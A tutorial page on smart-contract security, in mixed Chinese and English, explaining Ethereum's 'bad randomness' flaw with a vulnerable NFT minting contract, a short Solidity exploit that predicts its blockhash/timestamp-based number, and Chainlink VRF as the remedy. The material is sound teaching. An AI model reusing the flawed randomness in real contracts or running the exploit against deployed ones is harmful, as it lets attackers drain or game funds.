---
title: Bad Randomness
displayed_sidebar: generalSidebar
keywords:
  - smart contracts
  - security
  - vulnerabilities
  - randomness
  - nft
  - gamefi
  - ethereum
  - solidity
  - pseudo-random
  - blockhash
  - keccak256
  - chainlink-vrf
tags:
  - Bad Randomness
  - Security
  - 智能合约
---

# Bad Randomness

## 伪随机数

以太坊上的许多应用程序，比如 NFT 随机 tokenId 抽奖、盲盒开启和 GameFi 战斗结果，都依赖于随机数。 然而，由于以太坊上的所有数据都是公开和确定性的，传统的随机生成方法如 `random()` 并不可用。

相反，项目通常使用伪随机数生成器，`blockhash()`和`keccak256()`。 This approach, known as the Bad Randomness Vulnerability, allows attackers to predict outcomes, enabling them to manipulate results like minting specific rare NFTs.

这种漏洞在NFT和GameFi项目中很常见，包括Meebits, Loots, and Wolf Game。 它已经造成了重大的财务损失，比如 SmartBillions 彩票漏洞，攻击者利用可预测的结果赢得了超过 400 ETH。 更多信息请参阅文章, [区块链彩票被黑客攻击，损失12万美元](https://crypto.news/blockchain-lottery-smartbillions-hacked-for-120000/)。

## Example of a Bad Randomness Vulnerability

我们来探讨一个存在漏洞的NFT合约，`FlawedRandomizer.sol`。

```solidity
contract FlawedRandomizer is ERC721 {
    uint256 public totalMints;

    // Constructor initializes the NFT collection's name and symbol.
    constructor() ERC721("", ""){}

    // Mint function: mints only when the input luckyNumber equals the random number.
    function mintIfLucky(uint256 guessedNumber) public {
        uint256 pseudoRandomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // Get pseudo-random number
        require(pseudoRandomNumber == guessedNumber, "Try again next time!");

        _mint(msg.sender, totalMints);
        totalMints++;
    }
}
```

主函数`mintIfLucky()`要求用户输入一个`0-99`之间的数字。 如果与链生成的伪随机数 `pseudoRandomNumber`匹配，则可以铸造一枚幸运的NFT。 漏洞在于用户能够完全预测生成的随机数并铸造NFT。

我们编写一个攻击合约`Exploit.sol`。

```solidity
contract Exploit {
    function executeMint(FlawedRandomizer nftAddress) public {
        // Calculate the random number in advance
        uint256 predictedNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // Use predictedNumber to execute the attack
        nftAddress.mintIfLucky(predictedNumber);
    }
}
```

函数`executeMint()` 以`FlawedRandomizer`合约地址为参数。 在这里，我们计算`predictedNumber`，然后将其传递到`mintIfLucky()` 函数来执行攻击。 由于在同一个区块中调用`executeMint()` 和 `mintIfLucky()`，`blockhash`和`block.timestamp`是相同的，因此可以预测生成的随机数字。

## 预防策略

使用Oracle项目提供的链下随机数来防止这种类型的漏洞，例如Chainlink VRF。 这些随机数是在链下生成的，并上传到区块链，确保它们是不可预测的。
